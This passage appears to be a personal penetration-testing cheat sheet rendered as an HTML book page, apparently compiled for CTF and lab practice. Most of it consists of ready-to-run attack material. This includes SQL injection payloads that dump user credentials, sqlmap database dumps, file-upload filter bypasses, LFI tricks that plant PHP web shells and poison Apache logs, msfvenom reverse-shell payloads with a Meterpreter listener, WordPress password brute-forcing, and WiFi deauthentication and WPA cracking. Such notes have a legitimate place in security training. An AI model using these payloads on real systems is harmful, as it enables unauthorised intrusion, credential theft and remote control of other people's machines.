<pre><code>nikto -host IP -port PORT
</code></pre>
<h3><a class="header" href="#dirb" id="dirb">Dirb</a></h3>
<pre><code>dirb http://IP wordlist
</code></pre>
<h3><a class="header" href="#wpscan" id="wpscan">WPScan</a></h3>
<pre><code>wpscan -u &quot;url&quot; --disable-tls-checks
wpscan --url http://IP/wp -e ap --log wpscan.out
</code></pre>
<p><code>--enumerate p,t,u</code> option to enumerate plugins, themes, and users</p>
<pre><code>For brute forcing a user
wpscan --url http://10.10.212.130:80/blog -e p,t,u --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50

Multiple users
wpscan -U users.txt -P /usr/share/wordlists/fasttrack.txt --url URL
</code></pre>
<h2><a class="header" href="#dns" id="dns">DNS</a></h2>
<pre><code>dig axfr @10.10.10.13 cronos.htb
</code></pre>
<pre><code>nslookup
&gt;server 10.10.10.13
&gt;cronos.htb
</code></pre>
<h2><a class="header" href="#scripts-that-merge-these-tools" id="scripts-that-merge-these-tools">Scripts that merge these tools</a></h2>
<p>The cyber mentor script</p>
<p>https://pastebin.com/MhE6zXVt</p>
<h1><a class="header" href="#sql-injection-2" id="sql-injection-2">SQL Injection</a></h1>
<p><strong>Line Comments Sample SQL Injection Attacks</strong></p>
<ul>
<li>
<p>Username: <code>admin'--</code></p>
</li>
<li>
<p>Username: <code>admin' OR 1=1; --</code></p>
</li>
<li>
<p>Username: <code>admin' sleep(10);</code></p>
</li>
</ul>
<h3><a class="header" href="#enumerating-columns-in-a-table" id="enumerating-columns-in-a-table">Enumerating columns in a table</a></h3>
<p>Start by incrementing the ORDER BY value untill you get an error</p>
<pre><code>searchitem=test' ORDER BY 3-- -
</code></pre>
<p>After getting the column information it is time to use union </p>
<pre><code>searchitem=test' UNION SELECT 1,2,3-- -
</code></pre>
<p>If this produces “1,2,3” on the page and we can hijack one of these and replace it with a nested SQL statement like:</p>
<pre><code>searchitem=test' UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -

searchitem=test' UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'db'),3-- -

searchitem=test' UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'),3-- -

searchitem=test' UNION SELECT 1,(select username from db.users),3-- -


/admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -

/admin?user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
</code></pre>
<h2><a class="header" href="#lfi" id="lfi">LFI</a></h2>
<pre><code>/room.php?cod=999 UNION SELECT &quot;1&quot;,&quot;2&quot;,(SELECT '&lt;?php phpinfo(); ?&gt;'),&quot;4&quot;,&quot;5&quot;,&quot;6&quot; INTO OUTFILE '/var/www/html/test.php'

Placeholders are present just to complete the UNION statement
</code></pre>
<h2><a class="header" href="#sql-map" id="sql-map">SQL Map</a></h2>
<h3><a class="header" href="#from-burpzap-capture" id="from-burpzap-capture">From Burp/ZAP capture</a></h3>
<p>Capture the request and create a req.txt file</p>
<pre><code>sqlmap -r req.txt --current-user

sqlmap -r request.txt --dbms=mysql --dump

-r uses the intercepted request you saved earlier
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database
</code></pre>
<h3><a class="header" href="#get-request-injection" id="get-request-injection">GET Request Injection</a></h3>
<pre><code>sqlmap -u &quot;http://example.com/?id=1&quot; -p id
sqlmap -u &quot;http://example.com/?id=*&quot; -p id
</code></pre>
<h3><a class="header" href="#post-request-injection" id="post-request-injection">POST Request Injection</a></h3>
<pre><code>sqlmap -u &quot;http://example.com&quot; --data &quot;username=*&amp;password=*&quot;
</code></pre>
<h3><a class="header" href="#" id=""></a></h3>
<pre><code>sqlmap -u &quot;http://10.10.35.99/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

To dump specific database tables
sqlmap -u &quot;http://10.10.35.99/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --random-agent --dbs -p list[fullordering] -D joomla --tables

To dump table contents
sqlmap -u &quot;http://10.10.35.99/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --random-agent --dbs -p list[fullordering] -D joomla -T &quot;#__users&quot; --dump
</code></pre>
<h1><a class="header" href="#file-upload-1" id="file-upload-1">File Upload</a></h1>
<h2><a class="header" href="#notes" id="notes">Notes</a></h2>
<ul>
<li>
<p>Null bytes, e.g. .php%00.jpg, where .jpg gets truncated and .php becomes the new extension</p>
</li>
<li>
<p>Try to upload a file with a double extension (ex: file.png.php or file.png.php5).</p>
</li>
<li>
<p>PHP extensions: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
ASP extensions: .asp, .aspx, .config</p>
</li>
<li>
<p>Try to uppercase some letter(s) of the extension. Like: .pHp, .pHP5, .PhAr ...</p>
</li>
<li>
<p>Try to upload some reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code):
ex: file.php.png</p>
</li>
<li>
<p>Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain , application/octet-stream</p>
</li>
<li>
<p>Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command).  (&quot;.PNG....&quot;, &quot;GIF89a&quot; ,)</p>
</li>
</ul>
<h1><a class="header" href="#fuzzing-1" id="fuzzing-1">Fuzzing</a></h1>
<h2><a class="header" href="#wfuzz" id="wfuzz">Wfuzz</a></h2>
<pre><code>wfuzz -u http://URL/page.pgp?code=FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt

--hc 404 (ignore 404 results)
--hl=2 (ignore length 2 results)
</code></pre>
<h3><a class="header" href="#post-data" id="post-data">Post data</a></h3>
<pre><code>wfuzz -c -w /wordlist.txt -d &quot;username=FUZZ&amp;password=password&quot; --hs &quot;No acount found with that username&quot; http://IP
</code></pre>
<h1><a class="header" href="#lfi-1" id="lfi-1">LFI</a></h1>
<h2><a class="header" href="#php-wrappers" id="php-wrappers">PHP Wrappers</a></h2>
<h3><a class="header" href="#php-expect-wrapper" id="php-expect-wrapper">PHP Expect Wrapper</a></h3>
<pre><code>php?page=expect://ls
</code></pre>
<h3><a class="header" href="#php-wrapper-phpfile" id="php-wrapper-phpfile">PHP Wrapper php://file</a></h3>
<pre><code>example1.php?page=php://input&amp;cmd=ls
</code></pre>
<p>Then send post request with the following in the body</p>
<pre><code>&lt;?php echo shell_exec($_GET['cmd']);?&gt;
</code></pre>
<h3><a class="header" href="#php-phpfilter" id="php-phpfilter">PHP php://filter</a></h3>
<pre><code>vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

?page=php://filter/resource=/etc/passwd
</code></pre>
<h3><a class="header" href="#apache-log-poisoning-through-lfi" id="apache-log-poisoning-through-lfi">Apache Log Poisoning through LFI</a></h3>
<p>Check to see if you can access the access.log file</p>
<pre><code>192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log
</code></pre>
<p>Change the user-agent to this:</p>
<pre><code>&lt;?php system($_GET['cmd']); ?&gt;
</code></pre>
<p>Apache will execute the command and output the response into the access.log</p>
<pre><code>192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log&amp;cmd=whoami
</code></pre>
<h3><a class="header" href="#null-byte" id="null-byte">Null Byte</a></h3>
<pre><code>http://ex.com/index.php?page=../../../etc/passwd%00
</code></pre>
<h3><a class="header" href="#phpinfo-lfi" id="phpinfo-lfi">phpinfo LFI</a></h3>
<p>Find the script on the PayloadALlTheThings/File Inclusion-Path Traversal git repository (phpinfolfi.py)</p>
<p>Modify the payload from the script with the payload from php-reverse-shell.php</p>
<pre><code>locate php-reverse
/usr/share/laudanum/php/php-reverse-shell.php
</code></pre>
<p>Edit the IP address and the port</p>
<p>Check the LFIREQ variable.</p>
<p>Run script and listen for connection</p>
<h3><a class="header" href="#dotdotpwn-automation-tool" id="dotdotpwn-automation-tool">dotdotpwn automation tool</a></h3>
<pre><code>dotdotpwn -m http -h IP -o windows
</code></pre>
<h1><a class="header" href="#xss" id="xss">XSS</a></h1>
<p>https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt</p>
<p>https://www.scip.ch/en/?labs.20171214</p>
<h1><a class="header" href="#steganography" id="steganography">Steganography</a></h1>
<h2><a class="header" href="#steghide" id="steghide">Steghide</a></h2>
<pre><code>steghide extract -sf img.jpg -p &lt;passphrase&gt;
</code></pre>
<h2><a class="header" href="#binwalk" id="binwalk">Binwalk</a></h2>
<p><code>binwalk img.png # Discover hidden files</code></p>
<p><code>binwalk -Me img.png # extract files</code></p>
<h1><a class="header" href="#msf-venom" id="msf-venom">MSF-Venom</a></h1>
<pre><code>msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

-p = payload
lhost = our local host IP address
lport = the port to listen on
R = export the payload in raw format
</code></pre>
<h2><a class="header" href="#reverse-tcp-payload" id="reverse-tcp-payload">Reverse TCP Payload</a></h2>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f exe &gt; ./reverse_tcp.exe

On the attacker machine (msfconsole)

msf &gt; use exploit/multi/handler
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost IP
msf exploit(handler) &gt; set lport PORT
msf exploit(handler) &gt; exploit
</code></pre>
<h2><a class="header" href="#aspnet-shell" id="aspnet-shell">ASP.NET shell</a></h2>
<pre><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.9.134 lport=53 -f aspx -o notashell.aspx
</code></pre>
<h2><a class="header" href="#elf-shell" id="elf-shell">Elf shell</a></h2>
<p>Good for multi/handler</p>
<pre><code>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.11.9.134 LPORT=9002 -f elf -o rev
erse.elf
</code></pre>
<h1><a class="header" href="#wireless-penetration-testing" id="wireless-penetration-testing">Wireless Penetration Testing</a></h1>
<p>Check for conflicting processes</p>
<pre><code>airmon-ng check kill
</code></pre>
<p>Place card into monitor mode</p>
<pre><code>airmon-ng start wlan0
</code></pre>
<p>Find available devices</p>
<pre><code>airodump-ng wlan0mon
</code></pre>
<p>Start capturing information 
(channel 6)</p>
<pre><code>airmon-ng -c 6 --bssid MAC -w capture wlan0mon
</code></pre>
<p>Deauth attack</p>
<pre><code>aireplay-ng -0 1 -a MAC_AP -c MAC_CLIENT
</code></pre>
<p>Crack password</p>
<pre><code>aircrack-ng -w rockyou.txt -b MAC_AP capture--1.cap
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        

        

        

        
        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
